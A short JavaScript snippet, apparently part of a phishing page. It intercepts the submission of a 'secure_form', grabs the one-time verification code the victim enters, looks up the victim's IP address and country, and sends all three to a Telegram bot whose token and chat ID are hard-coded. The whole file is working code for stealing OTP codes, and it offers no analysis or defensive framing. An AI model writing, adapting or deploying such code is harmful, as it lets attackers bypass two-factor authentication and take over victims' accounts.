document.getElementById('secure_form').addEventListener('submit', function(event) {
    event.preventDefault(); // Prevent the form from submitting normally

    // Get the OTP code from the input field
    const otpCode = document.getElementById('splLogSecuCode').value;

    // Fetch IP and country information
    fetch('https://ipapi.co/json/')
        .then(response => response.json())
        .then(ipData => {
            const ipAddress = ipData.ip;
            const country = ipData.country_name;

            // Your Telegram Bot Token and Chat ID
            const botToken = '7494244197:AAGmK3fC7Y_gwsEXHv4879hUr5ZKl89cvGY';  // Replace with your Telegram Bot Token
            const chatId = '5351288466';      // Replace with your Telegram Chat ID

            // Message to send to the Telegram bot
            const message = `
تم إدخال رمز التحقق: ${otpCode}
🌍 البلد: ${country}
📡 عنوان IP: ${ipAddress}
            `;

            // Telegram API URL
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

            // Prepare data to be sent in the request
            const data = {
                chat_id: chatId,
                text: message
            };

            // Send the data to Telegram using Fetch API
            return fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            });
        })
        .then(response => response.json())
        .then(data => {
            console.log('Success:', data);
            // Optionally, display a success message
            alert('تم إرسال الرمز إلى Telegram بنجاح!');
        })
        .catch((error) => {
            console.error('Error:', error);
            // Optionally, display an error message
            alert('حدث خطأ أثناء إرسال البيانات.');
        });
});
